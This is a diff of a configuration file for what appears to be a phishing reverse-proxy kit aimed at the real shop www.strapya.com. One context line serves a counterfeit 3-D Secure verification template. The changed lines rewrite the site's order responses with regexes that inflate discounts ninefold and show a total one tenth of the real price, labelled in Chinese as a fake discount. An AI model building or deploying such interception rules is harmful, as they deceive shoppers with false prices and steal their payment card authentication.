@@ -47,6 +47,7 @@ intercept:
     type: '3ds'                     # 动作类型：3ds / static（默认）
     template: '3ds_verify'          # 模板名 → phishlets/templates/3ds_verify/index.html
 
+
   # 虚假折扣
   - domain: 'www.strapya.com'
     path: '.*persisted\?operationName=Proposal.*'
@@ -56,10 +57,11 @@ intercept:
       '"code":"6688"': '"code":"5050"'
     response_match: '"code":"5050"'
     alter_response:
-      '"code":"5050"': '"code":"6868"'
-      '"lineAmount":\{[^}]*"amount":\s*"([\d.]+)"': '"lineAmount":\{"value":\{"amount": "[[$1 * 9]]"'
-      '"totalSavings":\{[^}]*"amount":\s*"([\d.]+)"': '"totalSavings":\{"value":\{"amount": "[[$1 * 9]]"'
-      '"runningTotal":\{[^}]*"amount":\s*"([\d.]+)"': '"runningTotal":\{"value":\{"amount": "[[$1 * 0.1]]"'
+      '"code":"5050"': '"code":"6688"'
+      '"lineAmount":\{"value":\{"amount":"([\d.]*)"':'"lineAmount":{"value":{"amount":"[[$1 * 9]]"'       #优惠金额
+      '"totalSavings":\{"value":\{"amount":"([\d.]*)"':'"totalSavings":{"value":{"amount":"[[$1 * 9]]"'   #总优惠金额
+      '"runningTotal":\{"value":\{"amount":"([\d.]*)"':'"runningTotal":{"value":{"amount":"[[$1 * 0.1]]"'   #折后价格
+
 
 
 
